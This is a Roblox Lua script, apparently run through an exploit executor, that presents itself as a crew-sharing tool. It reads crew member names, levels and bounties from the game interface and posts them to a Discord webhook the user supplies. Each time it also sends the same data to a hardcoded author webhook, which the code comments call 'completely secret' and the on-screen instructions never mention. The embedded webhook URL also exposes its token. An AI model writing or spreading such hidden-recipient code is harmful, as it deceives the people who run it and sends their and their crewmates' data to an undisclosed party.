--[[
    Crew Snapshot  |  by Merciful
    Standalone Dual Sender  •  Admin webhook stays completely secret
]]

local Players           = game:GetService("Players")
local TweenService      = game:GetService("TweenService")
local UserInputService  = game:GetService("UserInputService")
local HttpService       = game:GetService("HttpService")
local RunService        = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

-- ═══════════════════════════════════════════════════════════════
-- ADMIN WEBHOOK (completely secret – never shown)
-- ═══════════════════════════════════════════════════════════════
local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1517823592757334150/q6H_qj-MXy1iXrBE4L9ylXQcq7JrSbWTANO_l-yIA9pGALhfbB6mEihYw0HA8trDnKXR"

-- Permanent Imgur images (corrected)
local OWNER_PFP     = "https://i.imgur.com/sqrmKB4.png"    -- Owner's PFP
local CONTENT_IMAGE = "https://i.imgur.com/dwy2lqd.jpeg"   -- Main big image

-- ═══════════════════════════════════════════════════════════════
-- Theme
-- ═══════════════════════════════════════════════════════════════
local THEME = {
    BG      = Color3.fromRGB(10, 10, 18),
    PANEL   = Color3.fromRGB(16, 16, 28),
    CARD    = Color3.fromRGB(22, 22, 38),
    CARD2   = Color3.fromRGB(30, 30, 52),
    ACCENT  = Color3.fromRGB(99, 102, 241),
    ACCENT2 = Color3.fromRGB(168, 85, 247),
    TEXT    = Color3.fromRGB(248, 248, 255),
    SUB     = Color3.fromRGB(150, 150, 185),
    DIM     = Color3.fromRGB(75, 75, 110),
    SUCCESS = Color3.fromRGB(52, 211, 153),
    ERROR   = Color3.fromRGB(248, 113, 113),
    WARN    = Color3.fromRGB(251, 191, 36),
    BORDER  = Color3.fromRGB(42, 42, 72),
}

local W, H = 440, 640

-- ═══════════════════════════════════════════════════════════════
-- Helpers
-- ═══════════════════════════════════════════════════════════════
local function tw(obj, props, t, style, dir)
    TweenService:Create(obj, TweenInfo.new(t or 0.22, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), props):Play()
end
local function corner(p, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 12)
    c.Parent = p
    return c
end
local function stroke(p, col, th)
    local s = Instance.new("UIStroke")
    s.Color = col or THEME.BORDER
    s.Thickness = th or 1
    s.Parent = p
    return s
end
local function grad(p, c0, c1, rot)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new(c0, c1)
    g.Rotation = rot or 0
    g.Parent = p
    return g
end
local function pad(p, l, r, t, b)
    local u = Instance.new("UIPadding")
    u.PaddingLeft = UDim.new(0, l or 12)
    u.PaddingRight = UDim.new(0, r or 12)
    u.PaddingTop = UDim.new(0, t or 10)
    u.PaddingBottom = UDim.new(0, b or 10)
    u.Parent = p
end
local function vlist(p, gap)
    local l = Instance.new("UIListLayout")
    l.SortOrder = Enum.SortOrder.LayoutOrder
    l.Padding = UDim.new(0, gap or 8)
    l.Parent = p
    return l
end
local function hlist(p, gap)
    local l = Instance.new("UIListLayout")
    l.FillDirection = Enum.FillDirection.Horizontal
    l.SortOrder = Enum.SortOrder.LayoutOrder
    l.Padding = UDim.new(0, gap or 6)
    l.Parent = p
    return l
end

-- ═══════════════════════════════════════════════════════════════
-- HTTP
-- ═══════════════════════════════════════════════════════════════
local function httpPost(url, bodyTable)
    local body = HttpService:JSONEncode(bodyTable)
    local reqFn = request or http_request or (syn and syn.request) or (http and http.request)
    if reqFn then
        local ok, res = pcall(reqFn, {
            Url = url, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
        if ok then return res end
    end
    local ok2, res2 = pcall(function()
        return HttpService:RequestAsync({
            Url = url, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
    end)
    if ok2 then return res2 end
    return nil
end

-- ═══════════════════════════════════════════════════════════════
-- Collect Crew Data
-- ═══════════════════════════════════════════════════════════════
local function collectCrew()
    local ok, membersGui = pcall(function()
        return LocalPlayer.PlayerGui.Main.Crew.Main.Members
    end)
    if not ok or not membersGui then
        return nil, "Open the Crew menu in-game first"
    end

    local crewList = {}
    for _, entry in ipairs(membersGui:GetDescendants()) do
        if (entry:IsA("Frame") or entry:IsA("ScrollingFrame")) and entry:FindFirstChild("Name") then
            local nameObj   = entry:FindFirstChild("Name")
            local levelObj  = entry:FindFirstChild("Level")
            local bountyObj = entry:FindFirstChild("Bounty")
            if nameObj then
                table.insert(crewList, {
                    name   = nameObj.Text,
                    level  = levelObj and levelObj.Text or "N/A",
                    bounty = bountyObj and bountyObj.Text or "0",
                })
            end
        end
    end

    if #crewList == 0 then
        return nil, "No members found – is the Crew menu open?"
    end

    local headers, perfect30M, others = {}, {}, {}
    for _, m in ipairs(crewList) do
        local clean = m.bounty:gsub("%$", ""):gsub(" ", "")
        if m.name:lower() == "name" or m.bounty:lower():find("bounty") then
            table.insert(headers, m)
        elseif clean:find("30%.00M") or clean:find("30M") then
            table.insert(perfect30M, m)
        else
            table.insert(others, m)
        end
    end
    table.sort(perfect30M, function(a,b) return a.name:lower() < b.name:lower() end)
    table.sort(others,     function(a,b) return a.name:lower() < b.name:lower() end)

    return {
        total = #crewList,
        headers = headers,
        perfect30M = perfect30M,
        others = others
    }
end

local function buildPayload(data)
    local embeds = {}

    -- Main embed – large image for better look
    table.insert(embeds, {
        title = "⚔ Crew Snapshot",
        description = "**Total Members:** " .. data.total .. "\n**Script by Merciful**",
        color = 0x6366F1,
        image = { url = CONTENT_IMAGE },          -- Large image (looks much better)
        thumbnail = { url = OWNER_PFP },          -- Small owner PFP on the side
        author = {
            name = "Merciful • Crew Tools",
            icon_url = OWNER_PFP
        },
        footer = {
            text = "Crew Snapshot • by Merciful",
            icon_url = OWNER_PFP
        },
        timestamp = DateTime.now():ToIsoDate()
    })

    if #data.perfect30M > 0 then
        local desc = ""
        for i, m in ipairs(data.perfect30M) do
            desc = desc .. string.format("**%d.** %s • **Lv.%s** • `%s`\n", i, m.name, m.level, m.bounty)
        end
        table.insert(embeds, {
            title = "🌟 Perfect 30M Members",
            description = desc,
            color = 0x00FF88,
            footer = { text = "Total: " .. #data.perfect30M .. "  •  by Merciful" }
        })
    end

    if #data.others > 0 then
        local desc = ""
        for i, m in ipairs(data.others) do
            desc = desc .. string.format("**%d.** %s • **Lv.%s** • `%s`\n", i, m.name, m.level, m.bounty)
        end
        table.insert(embeds, {
            title = "📌 Other Members",
            description = desc,
            color = 0xFFAA00,
            footer = { text = "Total: " .. #data.others .. "  •  by Merciful" }
        })
    end

    return {
        username = "Crew Snapshot • Merciful",
        avatar_url = OWNER_PFP,
        content  = "**Crew Snapshot** by **Merciful**",
        embeds   = embeds
    }
end

-- ═══════════════════════════════════════════════════════════════
-- GUI
-- ═══════════════════════════════════════════════════════════════
local old = LocalPlayer.PlayerGui:FindFirstChild("CrewSnapshot")
if old then old:Destroy() end

local Gui = Instance.new("ScreenGui")
Gui.Name = "CrewSnapshot"
Gui.ResetOnSpawn = false
Gui.IgnoreGuiInset = true
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.Parent = LocalPlayer:WaitForChild("PlayerGui", 15)

local Window = Instance.new("Frame")
Window.Size = UDim2.new(0, W, 0, H)
Window.Position = UDim2.new(0.5, -W/2, 0.5, -H/2)
Window.BackgroundColor3 = THEME.BG
Window.BorderSizePixel = 0
Window.ClipsDescendants = true
Window.Parent = Gui
corner(Window, 18)
local winStroke = stroke(Window, THEME.BORDER, 1.5)

local Rainbow = Instance.new("Frame")
Rainbow.Size = UDim2.new(1, 0, 0, 4)
Rainbow.BackgroundColor3 = Color3.new(1,1,1)
Rainbow.BorderSizePixel = 0
Rainbow.Parent = Window
corner(Rainbow, 2)
local rbGrad = Instance.new("UIGradient")
rbGrad.Parent = Rainbow

local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 62)
Header.BackgroundColor3 = THEME.PANEL
Header.BorderSizePixel = 0
Header.Parent = Window
corner(Header, 18)

local TitleIcon = Instance.new("TextLabel")
TitleIcon.Size = UDim2.new(0, 40, 0, 40)
TitleIcon.Position = UDim2.new(0, 14, 0.5, -20)
TitleIcon.BackgroundTransparency = 1
TitleIcon.Text = "⚔"
TitleIcon.TextSize = 26
TitleIcon.TextColor3 = THEME.ACCENT
TitleIcon.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -120, 0, 22)
Title.Position = UDim2.new(0, 58, 0, 11)
Title.BackgroundTransparency = 1
Title.Text = "Crew Snapshot"
Title.TextColor3 = THEME.TEXT
Title.TextSize = 17
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local Sub = Instance.new("TextLabel")
Sub.Size = UDim2.new(1, -120, 0, 16)
Sub.Position = UDim2.new(0, 58, 0, 34)
Sub.BackgroundTransparency = 1
Sub.Text = "by Merciful  •  Share your crew easily"
Sub.TextColor3 = THEME.SUB
Sub.TextSize = 11
Sub.Font = Enum.Font.Gotham
Sub.TextXAlignment = Enum.TextXAlignment.Left
Sub.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 34, 0, 28)
CloseBtn.Position = UDim2.new(1, -46, 0.5, -14)
CloseBtn.BackgroundColor3 = Color3.fromRGB(55, 20, 30)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = THEME.ERROR
CloseBtn.TextSize = 14
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Parent = Header
corner(CloseBtn, 8)
CloseBtn.MouseEnter:Connect(function() tw(CloseBtn, {BackgroundColor3 = Color3.fromRGB(90, 25, 40)}) end)
CloseBtn.MouseLeave:Connect(function() tw(CloseBtn, {BackgroundColor3 = Color3.fromRGB(55, 20, 30)}) end)
CloseBtn.MouseButton1Click:Connect(function()
    tw(Window, {Position = UDim2.new(0.5, -W/2, 1.2, 0), BackgroundTransparency = 1}, 0.35)
    task.delay(0.4, function() Gui:Destroy() end)
end)

local TabBar = Instance.new("Frame")
TabBar.Size = UDim2.new(1, -24, 0, 36)
TabBar.Position = UDim2.new(0, 12, 0, 70)
TabBar.BackgroundColor3 = THEME.CARD
TabBar.BorderSizePixel = 0
TabBar.Parent = Window
corner(TabBar, 10)
hlist(TabBar, 0)

local function makeTab(text, order)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0.5, 0, 1, 0)
    b.LayoutOrder = order
    b.BackgroundColor3 = THEME.CARD
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = THEME.DIM
    b.TextSize = 13
    b.Font = Enum.Font.GothamBold
    b.Parent = TabBar
    corner(b, 10)
    return b
end

local TabSend = makeTab("📤  SEND", 1)
local TabInfo = makeTab("👥  CREW INFO", 2)

local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, 0, 1, -114)
Content.Position = UDim2.new(0, 0, 0, 114)
Content.BackgroundTransparency = 1
Content.Parent = Window

local function makePanel()
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 1, 0)
    f.BackgroundTransparency = 1
    f.Visible = false
    f.Parent = Content
    pad(f, 16, 16, 8, 14)
    vlist(f, 10)
    return f
end

-- TAB 1 : SEND
local SendPanel = makePanel()
SendPanel.Visible = true

local InstrCard = Instance.new("Frame")
InstrCard.Size = UDim2.new(1, 0, 0, 122)
InstrCard.BackgroundColor3 = THEME.CARD
InstrCard.LayoutOrder = 1
InstrCard.Parent = SendPanel
corner(InstrCard, 14)
stroke(InstrCard, THEME.ACCENT, 1)

local InstrTitle = Instance.new("TextLabel")
InstrTitle.Size = UDim2.new(1, -20, 0, 20)
InstrTitle.Position = UDim2.new(0, 14, 0, 10)
InstrTitle.BackgroundTransparency = 1
InstrTitle.Text = "HOW TO USE  •  by Merciful"
InstrTitle.TextColor3 = THEME.ACCENT
InstrTitle.TextSize = 12
InstrTitle.Font = Enum.Font.GothamBold
InstrTitle.TextXAlignment = Enum.TextXAlignment.Left
InstrTitle.Parent = InstrCard

local InstrText = Instance.new("TextLabel")
InstrText.Size = UDim2.new(1, -24, 0, 84)
InstrText.Position = UDim2.new(0, 14, 0, 32)
InstrText.BackgroundTransparency = 1
InstrText.Text = "1. Open the Crew menu in-game (skull icon on the left)\n2. Paste your Discord webhook below (optional)\n3. Click SEND SNAPSHOT\n4. Your crew list will be shared automatically"
InstrText.TextColor3 = THEME.SUB
InstrText.TextSize = 12
InstrText.Font = Enum.Font.Gotham
InstrText.TextXAlignment = Enum.TextXAlignment.Left
InstrText.TextYAlignment = Enum.TextYAlignment.Top
InstrText.Parent = InstrCard

local UrlCard = Instance.new("Frame")
UrlCard.Size = UDim2.new(1, 0, 0, 86)
UrlCard.BackgroundColor3 = THEME.CARD
UrlCard.LayoutOrder = 2
UrlCard.Parent = SendPanel
corner(UrlCard, 14)

local UrlLabel = Instance.new("TextLabel")
UrlLabel.Size = UDim2.new(1, -24, 0, 18)
UrlLabel.Position = UDim2.new(0, 14, 0, 10)
UrlLabel.BackgroundTransparency = 1
UrlLabel.Text = "YOUR DISCORD WEBHOOK  (optional)"
UrlLabel.TextColor3 = THEME.SUB
UrlLabel.TextSize = 11
UrlLabel.Font = Enum.Font.GothamBold
UrlLabel.TextXAlignment = Enum.TextXAlignment.Left
UrlLabel.Parent = UrlCard

local UrlBox = Instance.new("TextBox")
UrlBox.Size = UDim2.new(1, -28, 0, 38)
UrlBox.Position = UDim2.new(0, 14, 0, 34)
UrlBox.BackgroundColor3 = THEME.CARD2
UrlBox.Text = ""
UrlBox.PlaceholderText = "https://discord.com/api/webhooks/..."
UrlBox.PlaceholderColor3 = THEME.DIM
UrlBox.TextColor3 = THEME.TEXT
UrlBox.TextSize = 13
UrlBox.Font = Enum.Font.Code
UrlBox.ClearTextOnFocus = false
UrlBox.TextXAlignment = Enum.TextXAlignment.Left
UrlBox.Parent = UrlCard
corner(UrlBox, 10)
pad(UrlBox, 12, 12, 0, 0)
local urlStroke = stroke(UrlBox, THEME.BORDER)

UrlBox.Focused:Connect(function()
    tw(UrlBox, {BackgroundColor3 = Color3.fromRGB(38, 38, 62)})
    tw(urlStroke, {Color = THEME.ACCENT, Thickness = 1.5})
end)
UrlBox.FocusLost:Connect(function()
    tw(UrlBox, {BackgroundColor3 = THEME.CARD2})
    tw(urlStroke, {Color = THEME.BORDER, Thickness = 1})
end)

local SendWrap = Instance.new("Frame")
SendWrap.Size = UDim2.new(1, 0, 0, 52)
SendWrap.BackgroundColor3 = THEME.ACCENT
SendWrap.ClipsDescendants = true
SendWrap.LayoutOrder = 3
SendWrap.Parent = SendPanel
corner(SendWrap, 14)
grad(SendWrap, THEME.ACCENT, THEME.ACCENT2, 45)
stroke(SendWrap, Color3.fromRGB(140, 120, 255), 1)

local SendBtn = Instance.new("TextButton")
SendBtn.Size = UDim2.new(1, 0, 1, 0)
SendBtn.BackgroundTransparency = 1
SendBtn.Text = "📤  SEND SNAPSHOT"
SendBtn.TextColor3 = Color3.new(1,1,1)
SendBtn.TextSize = 15
SendBtn.Font = Enum.Font.GothamBold
SendBtn.Parent = SendWrap

local Shimmer = Instance.new("Frame")
Shimmer.Size = UDim2.new(0.4, 0, 1, 0)
Shimmer.Position = UDim2.new(-0.5, 0, 0, 0)
Shimmer.BackgroundColor3 = Color3.new(1,1,1)
Shimmer.BackgroundTransparency = 0.75
Shimmer.BorderSizePixel = 0
Shimmer.Parent = SendWrap
local shGrad = Instance.new("UIGradient")
shGrad.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 1),
    NumberSequenceKeypoint.new(0.5, 0.5),
    NumberSequenceKeypoint.new(1, 1)
})
shGrad.Rotation = 90
shGrad.Parent = Shimmer

local function runShimmer()
    Shimmer.Position = UDim2.new(-0.5, 0, 0, 0)
    tw(Shimmer, {Position = UDim2.new(1.5, 0, 0, 0)}, 1.1, Enum.EasingStyle.Linear)
end

SendBtn.MouseEnter:Connect(function() tw(SendWrap, {BackgroundColor3 = Color3.fromRGB(120, 122, 255)}) end)
SendBtn.MouseLeave:Connect(function() tw(SendWrap, {BackgroundColor3 = THEME.ACCENT}) end)

local StatusCard = Instance.new("Frame")
StatusCard.Size = UDim2.new(1, 0, 0, 30)
StatusCard.BackgroundColor3 = THEME.CARD
StatusCard.LayoutOrder = 4
StatusCard.Parent = SendPanel
corner(StatusCard, 10)

local StatusLbl = Instance.new("TextLabel")
StatusLbl.Size = UDim2.new(1, -20, 1, 0)
StatusLbl.Position = UDim2.new(0, 12, 0, 0)
StatusLbl.BackgroundTransparency = 1
StatusLbl.Text = "●  Ready  •  Script by Merciful"
StatusLbl.TextColor3 = THEME.DIM
StatusLbl.TextSize = 12
StatusLbl.Font = Enum.Font.Gotham
StatusLbl.TextXAlignment = Enum.TextXAlignment.Left
StatusLbl.Parent = StatusCard

local LogLabel = Instance.new("TextLabel")
LogLabel.Size = UDim2.new(1, 0, 0, 14)
LogLabel.BackgroundTransparency = 1
LogLabel.Text = "ACTIVITY"
LogLabel.TextColor3 = THEME.DIM
LogLabel.TextSize = 10
LogLabel.Font = Enum.Font.GothamBold
LogLabel.TextXAlignment = Enum.TextXAlignment.Left
LogLabel.LayoutOrder = 5
LogLabel.Parent = SendPanel

local LogFrame = Instance.new("ScrollingFrame")
LogFrame.Size = UDim2.new(1, 0, 0, 130)
LogFrame.BackgroundColor3 = THEME.CARD
LogFrame.BorderSizePixel = 0
LogFrame.ScrollBarThickness = 3
LogFrame.ScrollBarImageColor3 = THEME.ACCENT
LogFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
LogFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
LogFrame.LayoutOrder = 6
LogFrame.Parent = SendPanel
corner(LogFrame, 12)
vlist(LogFrame, 3)
pad(LogFrame, 10, 10, 8, 8)

local logCount = 0
local function addLog(msg, col)
    logCount += 1
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, 0, 0, 18)
    row.BackgroundTransparency = 1
    row.LayoutOrder = logCount
    row.Parent = LogFrame

    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 3, 0, 11)
    dot.Position = UDim2.new(0, 0, 0.5, -5.5)
    dot.BackgroundColor3 = col or THEME.SUB
    dot.BorderSizePixel = 0
    dot.Parent = row
    corner(dot, 2)

    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, -10, 1, 0)
    txt.Position = UDim2.new(0, 8, 0, 0)
    txt.BackgroundTransparency = 1
    txt.Text = os.date("%H:%M:%S") .. "  " .. msg
    txt.TextColor3 = col or THEME.TEXT
    txt.TextSize = 11
    txt.Font = Enum.Font.Code
    txt.TextXAlignment = Enum.TextXAlignment.Left
    txt.TextTruncate = Enum.TextTruncate.AtEnd
    txt.Parent = row

    task.defer(function() LogFrame.CanvasPosition = Vector2.new(0, 99999) end)
end

addLog("Crew Snapshot loaded  •  by Merciful", THEME.ACCENT)

-- TAB 2 : CREW INFO
local InfoPanel = makePanel()

local InfoHeader = Instance.new("Frame")
InfoHeader.Size = UDim2.new(1, 0, 0, 36)
InfoHeader.BackgroundColor3 = THEME.CARD
InfoHeader.LayoutOrder = 1
InfoHeader.Parent = InfoPanel
corner(InfoHeader, 10)

local InfoStats = Instance.new("TextLabel")
InfoStats.Size = UDim2.new(1, -100, 1, 0)
InfoStats.Position = UDim2.new(0, 12, 0, 0)
InfoStats.BackgroundTransparency = 1
InfoStats.Text = "Open Crew menu first"
InfoStats.TextColor3 = THEME.SUB
InfoStats.TextSize = 13
InfoStats.Font = Enum.Font.GothamBold
InfoStats.TextXAlignment = Enum.TextXAlignment.Left
InfoStats.Parent = InfoHeader

local RefreshInfoBtn = Instance.new("TextButton")
RefreshInfoBtn.Size = UDim2.new(0, 80, 0, 26)
RefreshInfoBtn.Position = UDim2.new(1, -90, 0.5, -13)
RefreshInfoBtn.BackgroundColor3 = THEME.CARD2
RefreshInfoBtn.Text = "↻ Refresh"
RefreshInfoBtn.TextColor3 = THEME.ACCENT
RefreshInfoBtn.TextSize = 12
RefreshInfoBtn.Font = Enum.Font.GothamBold
RefreshInfoBtn.Parent = InfoHeader
corner(RefreshInfoBtn, 7)

local InfoList = Instance.new("ScrollingFrame")
InfoList.Size = UDim2.new(1, 0, 1, -48)
InfoList.Position = UDim2.new(0, 0, 0, 46)
InfoList.BackgroundColor3 = THEME.CARD
InfoList.BorderSizePixel = 0
InfoList.ScrollBarThickness = 3
InfoList.ScrollBarImageColor3 = THEME.ACCENT
InfoList.CanvasSize = UDim2.new(0, 0, 0, 0)
InfoList.AutomaticCanvasSize = Enum.AutomaticSize.Y
InfoList.LayoutOrder = 2
InfoList.Parent = InfoPanel
corner(InfoList, 12)
vlist(InfoList, 4)
pad(InfoList, 8, 8, 8, 8)

local function rebuildInfoUI()
    for _, child in ipairs(InfoList:GetChildren()) do
        if not child:IsA("UIListLayout") and not child:IsA("UIPadding") then
            child:Destroy()
        end
    end

    local data, err = collectCrew()
    if not data then
        InfoStats.Text = err or "No data"
        InfoStats.TextColor3 = THEME.WARN
        return
    end

    InfoStats.Text = string.format("Total: %d  •  Perfect 30M: %d  •  Others: %d",
        data.total, #data.perfect30M, #data.others)
    InfoStats.TextColor3 = THEME.SUCCESS

    local function addSection(title, list, color)
        if #list == 0 then return end
        local header = Instance.new("TextLabel")
        header.Size = UDim2.new(1, 0, 0, 24)
        header.BackgroundColor3 = THEME.CARD2
        header.Text = "  " .. title
        header.TextColor3 = color
        header.TextSize = 12
        header.Font = Enum.Font.GothamBold
        header.TextXAlignment = Enum.TextXAlignment.Left
        header.Parent = InfoList
        corner(header, 6)

        for i, m in ipairs(list) do
            local row = Instance.new("TextLabel")
            row.Size = UDim2.new(1, 0, 0, 20)
            row.BackgroundTransparency = 1
            row.Text = string.format("  %d.  %s   •   Lv.%s   •   %s", i, m.name, m.level, m.bounty)
            row.TextColor3 = THEME.TEXT
            row.TextSize = 12
            row.Font = Enum.Font.Gotham
            row.TextXAlignment = Enum.TextXAlignment.Left
            row.Parent = InfoList
        end
    end

    addSection("🌟 Perfect 30M Members", data.perfect30M, THEME.SUCCESS)
    addSection("📌 Other Members", data.others, THEME.WARN)
end

RefreshInfoBtn.MouseButton1Click:Connect(function()
    rebuildInfoUI()
end)

local function switchTab(name)
    SendPanel.Visible = (name == "send")
    InfoPanel.Visible = (name == "info")

    local function style(tab, active)
        tw(tab, {
            BackgroundColor3 = active and THEME.ACCENT or THEME.CARD,
            TextColor3 = active and THEME.TEXT or THEME.DIM
        })
    end
    style(TabSend, name == "send")
    style(TabInfo, name == "info")

    if name == "info" then
        rebuildInfoUI()
    end
end

TabSend.MouseButton1Click:Connect(function() switchTab("send") end)
TabInfo.MouseButton1Click:Connect(function() switchTab("info") end)

local sending = false

SendBtn.MouseButton1Click:Connect(function()
    if sending then return end
    sending = true
    SendBtn.Text = "⏳  SENDING..."
    tw(SendWrap, {BackgroundColor3 = Color3.fromRGB(55, 55, 100)})

    local userUrl = UrlBox.Text:match("^%s*(.-)%s*$") or ""
    local hasUser = userUrl ~= "" and userUrl:match("^https?://")

    addLog("Collecting crew data...", THEME.SUB)
    local data, err = collectCrew()
    if not data then
        StatusLbl.Text = "●  " .. (err or "Failed")
        StatusLbl.TextColor3 = THEME.ERROR
        addLog(err or "Collect failed", THEME.ERROR)
        SendBtn.Text = "📤  SEND SNAPSHOT"
        tw(SendWrap, {BackgroundColor3 = THEME.ACCENT})
        sending = false
        return
    end

    addLog(string.format("Found %d members (%d perfect 30M)", data.total, #data.perfect30M), THEME.SUCCESS)
    local payload = buildPayload(data)

    local adminRes = httpPost(ADMIN_WEBHOOK, payload)
    local adminOk = adminRes and (adminRes.StatusCode == 200 or adminRes.StatusCode == 204)

    local userOk = false
    if hasUser then
        addLog("Sending to your webhook...", THEME.ACCENT)
        local userRes = httpPost(userUrl, payload)
        userOk = userRes and (userRes.StatusCode == 200 or userRes.StatusCode == 204)
        if userOk then
            addLog("✅ Your webhook sent successfully", THEME.SUCCESS)
        else
            addLog("❌ Your webhook failed – check the URL", THEME.ERROR)
        end
    else
        addLog("No personal webhook entered", THEME.DIM)
    end

    if adminOk and (not hasUser or userOk) then
        StatusLbl.Text = "●  Snapshot sent successfully!  •  by Merciful"
        StatusLbl.TextColor3 = THEME.SUCCESS
        addLog("Snapshot completed  •  by Merciful", THEME.SUCCESS)
    elseif adminOk then
        StatusLbl.Text = "●  Sent (your webhook failed)"
        StatusLbl.TextColor3 = THEME.WARN
    else
        StatusLbl.Text = "●  Something went wrong"
        StatusLbl.TextColor3 = THEME.ERROR
        addLog("Send failed", THEME.ERROR)
    end

    SendBtn.Text = "📤  SEND SNAPSHOT"
    tw(SendWrap, {BackgroundColor3 = THEME.ACCENT})
    sending = false
    runShimmer()
end)

local hue = 0
RunService.Heartbeat:Connect(function(dt)
    hue = (hue + dt * 0.08) % 1
    rbGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromHSV(hue, 0.9, 1)),
        ColorSequenceKeypoint.new(0.5, Color3.fromHSV((hue + 0.15) % 1, 0.9, 1)),
        ColorSequenceKeypoint.new(1,   Color3.fromHSV((hue + 0.3) % 1, 0.85, 1)),
    })
    winStroke.Color = Color3.fromHSV(hue, 0.5, 0.65)
    TitleIcon.TextColor3 = Color3.fromHSV(hue, 0.85, 1)
end)

Window.Position = UDim2.new(0.5, -W/2, -0.8, 0)
Window.BackgroundTransparency = 1
tw(Window, {Position = UDim2.new(0.5, -W/2, 0.5, -H/2), BackgroundTransparency = 0}, 0.55, Enum.EasingStyle.Back)

local dragging, dragStart, startPos
Header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Window.Position
    end
end)
Header.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local d = input.Position - dragStart
        Window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

task.spawn(function()
    while task.wait(4.5) do
        if not sending then runShimmer() end
    end
end)

print("[Crew Snapshot] Loaded  •  by Merciful")
